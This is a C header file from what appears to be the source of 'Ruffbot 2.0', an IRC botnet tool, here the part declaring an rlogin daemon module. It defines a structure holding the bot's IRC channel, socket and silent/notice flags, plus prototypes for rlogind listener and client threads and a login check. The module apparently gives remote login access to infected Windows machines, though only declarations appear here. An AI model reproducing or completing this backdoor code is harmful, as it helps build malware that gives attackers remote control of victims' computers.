/*
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXXX  XXXXXXXXXXXXXX 
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX     
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXX    XXXXXXXXXXXX     
XXXXXXXXX        XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX    
XXXX XXXXX       XXXXX      XXXXX  XXXXX           XXXXX           
XXXX  XXXXX      XXXXX      XXXXX  XXXXX           XXXXX           
XXXX   XXXXX     XXXXX      XXXXX  XXXXX           XXXXX           
XXXX    XXXXX    XXXXXX    XXXXXX  XXXXX           XXXXX           
XXXX     XXXXX   XXXXXXXXXXXXXXXX  XXXXX           XXXXX           
XXXX      XXXXX   XXXXXXXXXXXXXX   XXXXX           XXXXX           
XXXX       XXXXX   XXXXXXXXXXXX    XXXXX           XXXXX 
     



        Ruffbot 2.0 [PrivShit] by Ruffnes

*/ 


#ifndef NO_RLOGIND

#define PERMISSION_DENIED_MSG "Permission denied\n"

typedef struct RLOGIND 
{
	SOCKET sock;
	char chan[128];
	char username[64];
	char hostname[256];
	int port;
	int threadnum;
	int cthreadnum;
	BOOL insecure;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} RLOGIND;

static BOOL GetStr(SOCKET Socket, char *buffer, int cnt);
static BOOL CtrlHandler(DWORD CtrlType);
static BOOL CheckLogin(char *RemoteUser, char *RemoteHost, char *LocalUser, unsigned long ClientAddr);
DWORD WINAPI RlogindClientThread(LPVOID param);
DWORD WINAPI RlogindThread(LPVOID param);
#endif